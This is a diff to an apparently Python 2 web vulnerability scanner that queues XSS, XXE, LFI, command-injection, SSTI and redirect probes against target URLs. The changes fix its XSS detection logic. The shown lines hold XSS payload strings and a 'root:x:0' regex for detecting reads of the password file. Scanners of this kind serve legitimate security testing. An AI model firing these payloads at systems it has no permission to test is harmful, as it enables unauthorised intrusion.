@@ -39,7 +39,7 @@ logging.getLogger("requests").setLevel(logging.WARNING)
 lock = threading.Lock()
 # XSS规则
 XSS_Rule = {
-    "script":[
+    "xss":[
         "\" onfous=alert(document.domain)\"><\"",
         "\"`'></textarea><audio/onloadstart=confirm`1` src>",
         "\"</script><svg onload=alert`1`>",
@@ -186,7 +186,7 @@ def _init_get_url(url_group,rules,inqueue):
             domain = domain.rstrip("=")
             # domain = _url_item.replace(".", "_").replace(":", "_").replace("/", "_")
             inqueue.put({'action': _url_item, 'input': XXE_Role.replace('{domain}', domain), 'method': 'post', 'regex': None, 'headers': headers, 'type': 'xxe'})
-            
+
 
             # to use files upload, must delete the content-type key in headers
             headers.pop('Content-Type', None)
@@ -212,9 +212,9 @@ def _init_get_url(url_group,rules,inqueue):
                 #             inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})
 
                 continue
-            
+
             for r_type in rules.keys():
-                pullutioned_urls = Pollution(_url_item, rules[r_type])
+                pullutioned_urls = Pollution(_url_item, rules[r_type]).payload_generate()
                 if r_type == 'cli':
                     domain = base64.b64encode(_url_item).replace('=', '')
                     for i in pullutioned_urls:
@@ -227,8 +227,8 @@ def _init_get_url(url_group,rules,inqueue):
                             {'action':i,
                             'input':None,
                             'method':'get',
-                            'regex': "root:x:0", 
-                            'headers': headers, 
+                            'regex': "root:x:0",
+                            'headers': headers,
                             'type': 'lfi'}
                             )
                     if r_type == 'redirect':
@@ -240,7 +240,7 @@ def _init_get_url(url_group,rules,inqueue):
                             'headers': headers,
                             'type': 'redirect',
                         })
-                    
+
                     if r_type == 'cli':
                         inqueue.put({
                             'action': i,
@@ -250,7 +250,7 @@ def _init_get_url(url_group,rules,inqueue):
                             'headers': headers,
                             'type': 'cli',
                             })
-                    
+
                     if r_type == 'ssti':
                         inqueue.put({
                             'action': i,
@@ -265,11 +265,13 @@ def _init_get_url(url_group,rules,inqueue):
                             'action': i,
                             'input': None,
                             'method': 'get',
-                            'regex': '|'.join(rules[r_type])
+                            'regex': "|".join(rules[r_type]),
+                            'headers': headers,
+                            'type': 'xss'
                         })
 
-                
-                
+
+
 
 
             # url_parse = _url_item.replace('?'+uquery, '')
@@ -290,7 +292,7 @@ def _init_get_url(url_group,rules,inqueue):
 
             #             tmp_dict[parameter_item] = _rule
             #             tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
-                        
+
             #             if "lfi" == rule_item:
             #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
             #             if 'usr' in _rule:
@@ -322,7 +324,7 @@ class detectXSS(threading.Thread):
                 # if flag:
                 #     self.inqueue.get()
                 #     continue
-                logging.info(Fore.YELLOW + 'Remains: {} items>'.format(self.inqueue.qsize()) + Style.RESET_ALL)
+                # logging.info(Fore.YELLOW + 'Remains: {} items>'.format(self.inqueue.qsize()) + Style.RESET_ALL)
                 target = self.inqueue.get(timeout=3)
                 if target["method"] == "post":
                     self.request_do(target['action'], target['input'], target['regex'], target['headers'], target['type'])
@@ -360,7 +362,7 @@ class detectXSS(threading.Thread):
                     for name in ['imgFile', 'imgSrc', 'file', 'fileField']:
                         files = {name : ('image.png', _data, 'image/png')}
                         req = requests.post(url, headers=headers, files=files, verify=False, timeout=TIMEOUT)
-                        # global flag 
+                        # global flag
                         # flag = True
                 else:
                     req = requests.post(url,data=_data,timeout=TIMEOUT, headers=headers, verify=False)
@@ -377,17 +379,25 @@ class detectXSS(threading.Thread):
 
                 else:
                     req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False)
-            
+
             # if type == 'cli':
             #     return _bool
             if (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
                 return _bool
             req_result = ''.join(req.content.split('\n'))
-            if re.findall(_regex, req_result):
+
+            if type in ['redirect', 'ssti', 'lfi'] and re.findall(_regex, req_result):
                 _bool = True
+
+            if type == 'xss':
+                print "xss"
+                for i in XSS_Rule['xss']:
+                    if req_result.find(i) > -1:
+                        _bool = True
+                        break
             # if req_result.find(_regex) > -1:
             #     _bool = True
-            
+
             # return _bool
             # if "passwd" in _regex:
             #     if req_result.find('root:x:') > 0:
@@ -471,7 +481,7 @@ def start_point(args):
         print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL
 
     # print "[-][-] Done!"
-    # use classSQL to scan the error-based sqli 
+    # use classSQL to scan the error-based sqli
     for index in dict_result.keys():
         item = dict_result[index]
         url = item['url']
